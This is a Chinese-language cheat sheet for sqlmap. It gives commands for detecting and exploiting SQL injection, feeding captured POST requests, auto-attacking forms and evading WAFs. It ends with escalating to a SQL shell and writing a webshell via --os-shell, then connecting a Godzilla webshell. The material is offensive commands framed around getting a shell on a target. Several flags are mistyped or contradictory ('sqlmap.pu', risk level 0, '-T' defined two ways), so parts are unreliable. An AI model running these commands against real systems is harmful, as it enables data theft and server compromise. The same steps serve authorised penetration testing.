SQLMAP 详细使用  
1、单个URL（GET）、Cookie  
1）检测指定URL是否存在SQL注入漏洞：  
python sqlmap.py -u 目标URL  
2）设置Cookie参数，绕过Web应用程序的安全检查，检测是否含有SQL注入漏洞：  
python sqlmap.py -u 目标URL --cookie="cookie参数"

2、文件URL、POST  
1）检测指定文件中的全部URL是否存在SQL注入漏洞  
python sqlmap.py -m 文件名  
2）通过POST请求包进行SQL注入（Burp抓包），检测是否含有SQL注入漏洞  
python sqlmap.py -r POST请求包  
或  
python sqlmap.py -u "http://example.com/login.php" --data "username=1&password=1"(注入点)  

一种很新颖的方式  
python sqlmap.py -u "http://127.0.0.1" --forms --batch  自动分析表单，自动打注入点

3）指定进行检测的数据库类型  
python sqlmap.py -u 目标URL -dbms 数据库类型  
-D 指定数据库  
-T 指定表  
-C 指定字段

7、绕过WAF

随机UA：  
python sqlmap.pu -u 目标URL --random-agent  
自定义UA：  
python sqlmap.pu -u 目标URL --user-agent ' '  
指定测试等级（由1至5）：  
python sqlmap.pu -u 目标URL --level=1  
指定风险等级（由0至3）：  
python sqlmap.pu -u 目标URL --risk=1  
level参数：指定扫描深度的级别，范围为1-5，级别越高，扫描的深度就越深。具体含义如下：  
1级别：只做最基本的测试，速度最快。2级别：会测试大部分的注入点，但不会尝试绕过WAF或IDS等安全设备。3级别：会测试所有可疑的注入点，并尝试绕过WAF或IDS等安全设备。4级别：比较耗时，会进行一些额外的测试和检测。5级别：最深度的测试，将尽可能地测试所有的注入点和漏洞。  
risk参数：指定扫描的风险级别，范围为0-3，级别越高，扫描的敏感性越高。具体含义如下：  
0级别：只针对一些非常明显的、极易被发现的漏洞进行测试。1级别：测试所有普通的注入点。2级别：测试所有可疑的注入点，并使用一些高级的技术尝试绕过安全机制。3级别：最高风险级别，尝试针对所有可能的注入点进行测试，并使用一切可用的技术和手段进行攻击。  
-T 3 速度  
-n 不进行dns解析  

--sql-shell获取sqlshell  
让你获得数据库级别的权限，只能执行 sql 语句，不能执行命令！！ 但是不能说能执行任意 sql 语句，具体能执行多少，就看后端 sql 语句支持多少。简单验证  
@@version 获取版本 sleep(3)   延迟 3 秒 @@datadir 获取路径 （为下一步getshell做准备）

--os-shell 本质原理就是写入 webshell，因此需要写入 webshell 的全部条件。   
1 root 权限    
2 secure_file_priv=''为空无限制  
3 知道 www 目录路径 知道web根目录，如D:/var/www  
具备上面三个条件，才能 getshell。  
如果是 sqlserver，条件没那么多，--os-shell 很多时候可以直接梭哈拿 shell。  
知道根目录也可自行访问，并连接哥斯拉getshell
